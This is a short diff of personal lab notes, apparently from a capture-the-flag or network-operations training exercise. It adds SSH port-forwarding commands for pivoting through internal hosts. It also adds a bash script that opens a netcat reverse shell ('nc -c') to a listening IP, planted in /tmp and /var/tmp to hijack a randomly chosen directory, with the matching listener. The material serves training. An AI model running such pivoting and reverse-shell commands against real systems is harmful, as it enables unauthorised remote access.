@@ -77,8 +77,15 @@ cron.!info,!debug                                                            # o
 //ctfd
 student@lin-ops:~$ ssh -S /tmp/jump jump -O forward -L 1230:192.168.28.105:2222
 student@lin-ops:~$ ssh comrade@127.0.0.1 -p 1230
+student@lin-ops:~$ ssh -MS /tmp/pivot comrade@127.0.0.1 -p 1230
+student@lin-ops:~$ ssh -S /tmp/pivot pivot -O forward -L 1233:192.168.28.27:22
+student@lin-ops:~$ ssh comrade@127.0.0.1 -p 1233
 
-
+make script in both /var/tmp and /tmp bc the cmd we working with (below) random
+#!/bin/bash
+nc -c 10.50.29.94 2345
+what we working with::: cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
+student@lin-ops:~$ nc -lvp 2345
 
 
 
